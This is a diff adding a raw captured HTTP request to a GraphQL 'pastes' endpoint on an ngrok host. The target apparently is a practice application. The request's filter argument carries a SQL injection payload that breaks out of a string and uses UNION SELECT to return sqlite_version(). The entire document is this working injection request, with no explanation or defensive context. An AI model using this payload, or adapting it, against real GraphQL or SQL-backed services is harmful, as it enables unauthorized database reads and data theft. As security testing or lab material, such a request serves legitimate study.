@@ -1,0 +1,18 @@
+POST /graphql HTTP/2
+Host: merlin-declivitous-crowdedly.ngrok-free.dev
+Cookie: abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; env=graphiql:disable
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/public_pastes
+Content-Type: application/json
+Content-Length: 354
+Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+
+{"query":"query pastes {\r\n    pastes(public: true, limit: 5, filter: \"w'union select 1,2,sqlite_version(),4,5,6,7,8--+\") {\r\n        burn\r\n        content\r\n        id\r\n        ipAddr\r\n        owner {\r\n            id\r\n            name\r\n        }\r\n        ownerId\r\n        public\r\n        title\r\n        userAgent\r\n    }\r\n}"}
